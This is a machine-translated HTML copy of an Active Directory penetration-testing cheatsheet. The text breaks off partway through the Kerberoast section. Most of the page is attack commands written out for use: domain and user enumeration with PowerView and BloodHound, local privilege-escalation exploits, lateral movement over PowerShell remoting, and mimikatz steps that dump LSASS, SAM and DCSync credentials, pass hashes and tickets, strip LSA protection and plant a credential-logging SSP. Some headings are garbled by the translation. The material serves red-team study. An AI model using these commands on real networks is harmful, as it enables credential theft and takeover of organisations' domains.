<html>
<head>
<title>Active Directory cheatsheet: part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">活动目录备忘单:第2部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/active-directory-cheatsheet-part-2-b18e9aa2e73a?source=collection_archive---------2-----------------------#2021-09-16">https://infosecwriteups.com/active-directory-cheatsheet-part-2-b18e9aa2e73a?source=collection_archive---------2-----------------------#2021-09-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="5641" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">与广告相关的所有内容的大列表</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/15d138a9abe502626c74348925f1d4a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*U2-WOg2-D8VEjgcL"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">unsplash.com</figcaption></figure><h1 id="b31f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">域枚举</h1><h1 id="56c6" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用PowerView</h1><p id="fd52" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" rel="noopener ugc nofollow" target="_blank">power view v . 3.0</a><br/><a class="ae mj" href="https://powersploit.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">power view Wiki</a></p><ul class=""><li id="1e4d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">获取当前域:<code class="fe mv mw mx my b">Get-Domain</code></li><li id="5b8c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">枚举其他域:<code class="fe mv mw mx my b">Get-Domain -Domain &lt;DomainName&gt;</code></li><li id="2300" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">获取域SID: <code class="fe mv mw mx my b">Get-DomainSID</code></li><li id="d747" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">获取域策略:</li></ul><p id="8dd5" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainPolicy #Will show us the policy configurations of the Domain about system access or kerberos Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy</code></p><p id="880d" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">获取域控制器:</p><ul class=""><li id="b979" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-DomainController Get-DomainController -Domain &lt;DomainName&gt;</code></li><li id="1f7b" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">枚举域用户:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a1ca" class="nl kw iq my b gy nm nn l no np">#Save all Domain Users to a file Get-DomainUser | Out-File -FilePath .\DomainUsers.txt  #Will return specific properties of a specific user Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List  #Enumerate user logged on a machine Get-NetLoggedon -ComputerName &lt;ComputerName&gt;  #Enumerate Session Information for a machine Get-NetSession -ComputerName &lt;ComputerName&gt;  #Enumerate domain machines of the current/specified domain where specific users are logged into Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName</span><span id="8380" class="nl kw iq my b gy nq nn l no np"><br/>Enum Domain Computers:</span><span id="3808" class="nl kw iq my b gy nq nn l no np">Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName  #Enumerate Live machines  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName</span></pre><p id="cffc" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举组和组成员:</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1782" class="nl kw iq my b gy nm nn l no np">#Save all Domain Groups to a file: Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt  #Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins) Get-DomainGroup -Identity '&lt;GroupName&gt;' | Select-Object -ExpandProperty Member  Get-DomainGroupMember -Identity '&lt;GroupName&gt;' | Select-Object MemberDistinguishedName  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine Get-NetLocalGroup | Select-Object GroupName  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName</span></pre><p id="408e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举共享:</p><p id="cddd" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">#Enumerate Domain Shares Find-DomainShare #Enumerate Domain Shares the current user has access Find-DomainShare -CheckShareAccess #Enumerate "Interesting" Files on accessible shares Find-InterestingDomainShareFile -Include *passwords*</code></p><p id="d085" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举组策略:</p><ul class=""><li id="d100" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName #Enumerate all GPOs to a specific computer Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName #Get users that are part of a Machine's local Admin group Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;</code></li><li id="ada3" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">枚举ou:</li></ul><p id="786e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainOU -Properties Name | Sort-Object -Property Name</code></p><ul class=""><li id="0a2d" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">枚举ACL:</li></ul><p id="ec04" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b"># Returns the ACLs associated with the specified account Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs #Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs #Check the ACLs associated with a specified path (e.g smb share) Get-PathAcl -Path "\\Path\Of\A\Share"</code></p><ul class=""><li id="b5b4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">枚举域信任:</li></ul><p id="a3fe" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-DomainTrust Get-DomainTrust -Domain &lt;DomainName&gt; #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds Get-DomainTrustMapping</code></p><ul class=""><li id="72a9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">枚举林信任:</li></ul><p id="bd97" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ForestDomain Get-ForestDomain -Forest &lt;ForestName&gt; #Map the Trust of the Forest Get-ForestTrust Get-ForestTrust -Forest &lt;ForestName&gt;</code></p><p id="7fba" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">用户搜寻:</p><ul class=""><li id="8d84" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">#Finds all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose #Find local admins on all machines of the domain Find-DomainLocalGroupMember -Verbose #Find computers were a Domain Admin OR a spesified user has a session Find-DomainUserLocation | Select-Object UserName, SessionFromName #Confirming admin access Test-AdminAccess</code></li></ul><p id="bc40" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">❗特权Esc域管理员与用户狩猎:<br/>我有一台机器上的本地管理员访问权限- &gt;一个域管理员在那台机器上有一个会话- &gt;我窃取他的令牌，并冒充他- &gt;利润！</p><h1 id="3f0f" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用AD模块</h1><ul class=""><li id="8638" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated">获取当前域:<code class="fe mv mw mx my b">Get-ADDomain</code></li><li id="2201" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">枚举其他域:<code class="fe mv mw mx my b">Get-ADDomain -Identity &lt;Domain&gt;</code></li><li id="1fce" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">获取域SID: <code class="fe mv mw mx my b">Get-DomainSID</code></li><li id="476e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">获取域控制器:</li></ul><p id="f250" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ADDomainController Get-ADDomainController -Identity &lt;DomainName&gt;</code></p><p id="84a7" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举域用户:</p><p id="d0be" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated"><code class="fe mv mw mx my b">Get-ADUser -Filter * -Identity &lt;user&gt; -Properties * #Get a spesific "string" on a user's attribute Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description</code></p><p id="ba20" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举域计算机:</p><ul class=""><li id="9fc3" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADComputer -Filter * -Properties * Get-ADGroup -Filter *</code></li></ul><p id="3f47" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举域信任:</p><ul class=""><li id="25c9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADTrust -Filter * Get-ADTrust -Identity &lt;DomainName&gt;</code></li></ul><p id="ec4e" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">枚举林信任:</p><ul class=""><li id="46c4" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><code class="fe mv mw mx my b">Get-ADForest Get-ADForest -Identity &lt;ForestName&gt; #Domains of Forest Enumeration (Get-ADForest).Domains</code></li><li id="01cd" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">枚举本地AppLocker有效策略:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="5375" class="nl kw iq my b gy nm nn l no np">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span></pre><h1 id="ba1c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用警犬</h1><h2 id="0351" class="nl kw iq bd kx nu nv dn lb nw nx dp lf lw ny nz lh ma oa ob lj me oc od ll oe bi translated">远程侦探犬</h2><p id="5834" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><a class="ae mj" href="https://github.com/fox-it/BloodHound.py" rel="noopener ugc nofollow" target="_blank"> Python BloodHound库</a>或者用<code class="fe mv mw mx my b">pip3 install bloodhound</code>安装</p><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="85a5" class="nl kw iq my b gy nm nn l no np">bloodhound-python -u &lt;UserName&gt; -p &lt;Password&gt; -ns &lt;Domain Controller's Ip&gt; -d &lt;Domain&gt; -c All</span></pre><h2 id="b820" class="nl kw iq bd kx nu nv dn lb nw nx dp lf lw ny nz lh ma oa ob lj me oc od ll oe bi translated">现场警犬</h2><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="4be3" class="nl kw iq my b gy nm nn l no np">#Using exe ingestor<br/>.\SharpHound.exe --CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --domain &lt;Domain&gt; --domaincontroller &lt;Domain Controller's Ip&gt; --OutputDirectory &lt;PathToFile&gt;<br/>    <br/>#Using powershell module ingestor<br/>. .\SharpHound.ps1<br/>Invoke-BloodHound -CollectionMethod All --LdapUsername &lt;UserName&gt; --LdapPassword &lt;Password&gt; --OutputDirectory &lt;PathToFile&gt;</span></pre><h1 id="f1c0" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">有用的枚举工具</h1><ul class=""><li id="51ee" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener ugc nofollow" target="_blank"> ldapdomaindump </a>通过LDAP进行信息转储</li><li id="680d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/dirkjanm/adidnsdump" rel="noopener ugc nofollow" target="_blank"> adidnsdump </a>任何认证用户的集成DNS转储</li><li id="06d2" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cyberark/ACLight" rel="noopener ugc nofollow" target="_blank">权限</a>特权帐户的高级发现</li><li id="8555" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/sense-of-security/ADRecon" rel="noopener ugc nofollow" target="_blank"> ADRecon </a>详细的活动目录重建工具</li></ul><h1 id="9eb4" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">本地权限提升</h1><ul class=""><li id="546e" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/ohpe/juicy-potato" rel="noopener ugc nofollow" target="_blank">多汁的土豆</a>滥用SeImpersonate或SeAssignPrimaryToken特权进行系统模拟</li><li id="2de8" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">⚠️只能运行到Windows Server 2016，Windows 10只能运行到1803补丁</li><li id="9523" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/TsukiCTF/Lovely-Potato" rel="noopener ugc nofollow" target="_blank">可爱的土豆</a>自动化多汁土豆</li><li id="be19" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">⚠️只能运行到Windows Server 2016，Windows 10只能运行到1803补丁</li><li id="213c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/PrintSpoofer" rel="noopener ugc nofollow" target="_blank"> PrintSpoofer </a>利用PrinterBug进行系统模拟</li><li id="c02d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">🙏适用于Windows Server 2019和Windows 10</li><li id="6b6e" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/antonioCoco/RoguePotato" rel="noopener ugc nofollow" target="_blank"> RoguePotato </a>升级版多汁马铃薯</li><li id="e167" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">🙏适用于Windows Server 2019和Windows 10</li><li id="3a90" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/" rel="noopener ugc nofollow" target="_blank">滥用代币特权</a></li><li id="e66d" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/" rel="noopener ugc nofollow" target="_blank">SMBGhost CVE-2020–0796</a><br/><a class="ae mj" href="https://github.com/danigargu/CVE-2020-0796" rel="noopener ugc nofollow" target="_blank">概念验证</a></li><li id="ed43" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/cube0x0/CVE-2021-36934" rel="noopener ugc nofollow" target="_blank">CVE-2021–36934</a></li></ul><h1 id="607d" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">有用的本地私有Esc工具</h1><ul class=""><li id="fa9b" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" rel="noopener ugc nofollow" target="_blank">加电</a>错误配置滥用</li><li id="bbf7" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/AlessandroZ/BeRoot" rel="noopener ugc nofollow" target="_blank"> BeRoot </a>通用权限Esc枚举工具</li><li id="3a31" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/enjoiz/Privesc" rel="noopener ugc nofollow" target="_blank">权限描述</a>通用权限描述枚举工具</li><li id="39fc" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/FullPowers" rel="noopener ugc nofollow" target="_blank">全权证书</a>恢复服务账户的权限</li></ul><h1 id="5517" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">横向运动</h1><h1 id="9ee8" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Powershell远程处理</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="8709" class="nl kw iq my b gy nm nn l no np">#Enable Powershell Remoting on current Machine (Needs Admin Access)<br/>Enable-PSRemoting</span><span id="ac1f" class="nl kw iq my b gy nq nn l no np">#Entering or Starting a new PSSession (Needs Admin Access)<br/>$sess = New-PSSession -ComputerName &lt;Name&gt;<br/>Enter-PSSession -ComputerName &lt;Name&gt; OR -Sessions &lt;SessionName&gt;</span></pre><h1 id="7cbe" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">使用PS凭据远程执行代码</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="05f0" class="nl kw iq my b gy nm nn l no np">$SecPassword = ConvertTo-SecureString '&lt;Wtver&gt;' -AsPlainText -Force<br/>$Cred = New-Object System.Management.Automation.PSCredential('htb.local\&lt;WtverUser&gt;', $SecPassword)<br/>Invoke-Command -ComputerName &lt;WtverMachine&gt; -Credential $Cred -ScriptBlock {whoami}</span></pre><h1 id="5a14" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">导入powershell模块并远程执行其功能</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="cfc7" class="nl kw iq my b gy nm nn l no np">#Execute the command and start a session<br/>Invoke-Command -Credential $cred -ComputerName &lt;NameOfComputer&gt; -FilePath c:\FilePath\file.ps1 -Session $sess </span><span id="3ba6" class="nl kw iq my b gy nq nn l no np">#Interact with the session<br/>Enter-PSSession -Session $sess</span></pre><h1 id="70dc" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">执行远程状态命令</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="1556" class="nl kw iq my b gy nm nn l no np">#Create a new session<br/>$sess = New-PSSession -ComputerName &lt;NameOfComputer&gt;</span><span id="d727" class="nl kw iq my b gy nq nn l no np">#Execute command on the session<br/>Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}</span><span id="11cf" class="nl kw iq my b gy nq nn l no np">#Check the result of the command to confirm we have an interactive session<br/>Invoke-Command -Session $sess -ScriptBlock {$ps}</span></pre><h1 id="8e55" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">米米卡茨</h1><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a66d" class="nl kw iq my b gy nm nn l no np">#The commands are in cobalt strike format!</span><span id="6d70" class="nl kw iq my b gy nq nn l no np">#Dump LSASS:<br/>mimikatz privilege::debug<br/>mimikatz token::elevate<br/>mimikatz sekurlsa::logonpasswords</span><span id="54a2" class="nl kw iq my b gy nq nn l no np">#(Over) Pass The Hash<br/>mimikatz privilege::debug<br/>mimikatz sekurlsa::pth /user:&lt;UserName&gt; /ntlm:&lt;&gt; /domain:&lt;DomainFQDN&gt;</span><span id="344b" class="nl kw iq my b gy nq nn l no np">#List all available kerberos tickets in memory<br/>mimikatz sekurlsa::tickets</span><span id="ea46" class="nl kw iq my b gy nq nn l no np">#Dump local Terminal Services credentials<br/>mimikatz sekurlsa::tspkg</span><span id="0be9" class="nl kw iq my b gy nq nn l no np">#Dump and save LSASS in a file<br/>mimikatz sekurlsa::minidump c:\temp\lsass.dmp</span><span id="07aa" class="nl kw iq my b gy nq nn l no np">#List cached MasterKeys<br/>mimikatz sekurlsa::dpapi</span><span id="5d4f" class="nl kw iq my b gy nq nn l no np">#List local Kerberos AES Keys<br/>mimikatz sekurlsa::ekeys</span><span id="8c15" class="nl kw iq my b gy nq nn l no np">#Dump SAM Database<br/>mimikatz lsadump::sam</span><span id="c00f" class="nl kw iq my b gy nq nn l no np">#Dump SECRETS Database<br/>mimikatz lsadump::secrets</span><span id="b874" class="nl kw iq my b gy nq nn l no np">#Inject and dump the Domain Controler's Credentials<br/>mimikatz privilege::debug<br/>mimikatz token::elevate<br/>mimikatz lsadump::lsa /inject</span><span id="5812" class="nl kw iq my b gy nq nn l no np">#Dump the Domain's Credentials without touching DC's LSASS and also remotely<br/>mimikatz lsadump::dcsync /domain:&lt;DomainFQDN&gt; /all</span><span id="2c6f" class="nl kw iq my b gy nq nn l no np">#List and Dump local kerberos credentials<br/>mimikatz kerberos::list /dump</span><span id="4e9c" class="nl kw iq my b gy nq nn l no np">#Pass The Ticket<br/>mimikatz kerberos::ptt &lt;PathToKirbiFile&gt;</span><span id="203f" class="nl kw iq my b gy nq nn l no np">#List TS/RDP sessions<br/>mimikatz ts::sessions</span><span id="102c" class="nl kw iq my b gy nq nn l no np">#List Vault credentials<br/>mimikatz vault::list</span></pre><p id="c9d7" class="pw-post-body-paragraph ln lo iq lp b lq mm jr ls lt mn ju lv lw ne ly lz ma nf mc md me ng mg mh mi ij bi translated">❗如果mimikatz因为LSA保护控制而无法转储凭证，该怎么办？\</p><ul class=""><li id="314e" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">LSA作为受保护的进程(内核土地旁路)</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="d834" class="nl kw iq my b gy nm nn l no np">#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1<br/>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa</span><span id="fbed" class="nl kw iq my b gy nq nn l no np">#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe<br/>#Now lets import the mimidriver.sys to the system<br/>mimikatz # !+</span><span id="dd3d" class="nl kw iq my b gy nq nn l no np">#Now lets remove the protection flags from lsass.exe process<br/>mimikatz # !processprotect /process:lsass.exe /remove</span><span id="be1f" class="nl kw iq my b gy nq nn l no np">#Finally run the logonpasswords function to dump lsass<br/>mimikatz # sekurlsa::logonpasswords</span></pre><ul class=""><li id="5b73" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">LSA作为受保护的进程(用户土地“无文件”绕过)</li><li id="18aa" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/itm4n/PPLdump" rel="noopener ugc nofollow" target="_blank"> PPLdump </a></li><li id="a28a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland" rel="noopener ugc nofollow" target="_blank">绕过用户区的LSA保护</a></li><li id="f884" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">LSA由凭据保护作为虚拟化进程(LSAISO)运行</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="a264" class="nl kw iq my b gy nm nn l no np">#Check if a process called lsaiso.exe exists on the running processes<br/>tasklist |findstr lsaiso</span><span id="29a9" class="nl kw iq my b gy nq nn l no np">#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.<br/>#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides<br/>mimikatz # misc::memssp</span><span id="e9d7" class="nl kw iq my b gy nq nn l no np">#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span></pre><ul class=""><li id="da16" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated"><a class="ae mj" href="https://adsecurity.org/?page_id=1821" rel="noopener ugc nofollow" target="_blank">详细的Mimikatz指南</a></li><li id="c524" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a" rel="noopener">用2个lsass保护选项四处打探</a></li></ul><h1 id="0aca" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">有用的工具</h1><ul class=""><li id="da62" class="mk ml iq lp b lq lr lt lu lw nr ma ns me nt mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/besimorhino/powercat" rel="noopener ugc nofollow" target="_blank"> Powercat </a> netcat用powershell编写，提供隧道、中继和端口转发功能。</li><li id="4b3a" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/Mr-Un1k0d3r/SCShell" rel="noopener ugc nofollow" target="_blank"> SCShell </a>依靠ChangeServiceConfigA运行命令的无文件横向移动工具</li><li id="dd1c" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated">用于黑客攻击/测试的终极Winrm外壳</li><li id="1612" class="mk ml iq lp b lq mz lt na lw nb ma nc me nd mi mr ms mt mu bi translated"><a class="ae mj" href="https://github.com/antonioCoco/RunasCs" rel="noopener ugc nofollow" target="_blank"> RunasCs </a> Csharp和windows内置runas.exe的开放版本</li></ul><h1 id="ce8c" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">域权限提升</h1><h1 id="9e50" class="kv kw iq bd kx ky kz la lb lc ld le lf jw lg jx lh jz li ka lj kc lk kd ll lm bi translated">Kerberoast</h1><p id="d535" class="pw-post-body-paragraph ln lo iq lp b lq lr jr ls lt lu ju lv lw lx ly lz ma mb mc md me mf mg mh mi ij bi translated"><em class="of"> WUT是DIS？:</em> <br/>所有标准域用户都可以请求所有服务帐户及其相关密码哈希的副本，因此我们可以向TGS请求绑定到“用户”<br/>帐户的任何SPN，提取使用用户密码加密的加密blob并强制其离线。</p><ul class=""><li id="08f9" class="mk ml iq lp b lq mm lt mn lw mo ma mp me mq mi mr ms mt mu bi translated">PowerView:</li></ul><pre class="kg kh ki kj gt nh my ni nj aw nk bi"><span id="f4c0" class="nl kw iq my b gy nm nn l no np">#Get User Accounts that are used as Service Accounts<br/>Get-NetUser 